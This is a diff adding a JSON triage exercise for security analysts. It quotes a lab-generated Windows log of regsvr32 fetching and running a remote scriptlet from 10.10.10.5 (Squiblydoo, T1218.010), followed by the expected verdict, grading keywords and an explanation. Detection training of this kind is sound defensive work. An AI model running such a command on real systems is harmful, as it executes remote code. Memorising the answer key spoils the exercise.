@@ -1,0 +1,20 @@
+{
+  "id": "real-regsvr32-scriptlet",
+  "title": "Real log: regsvr32 with a URL",
+  "difficulty": "medium",
+  "source": "Real telemetry from OTRF Security-Datasets (MIT), lab-generated, not employer data",
+  "logs": [
+    "03:27:52 EventID=1 Host=WORKSTATION5 User=MORDOR\\pgustavo Image=C:\\Windows\\System32\\regsvr32.exe ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=\"regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll"
+  ],
+  "question": "Verdict, and which technique is this?",
+  "verdict": "true_positive",
+  "keywords": [
+    "regsvr32",
+    "scriptlet",
+    "scrobj",
+    "remote",
+    "T1218",
+    "network"
+  ],
+  "explanation": "regsvr32 with /i:http and scrobj.dll downloads and runs a remote scriptlet without writing a file (T1218.010, often called Squiblydoo). Normal use registers a local DLL. Check the network connection to the server, what the scriptlet started next, and block the URL."
+}
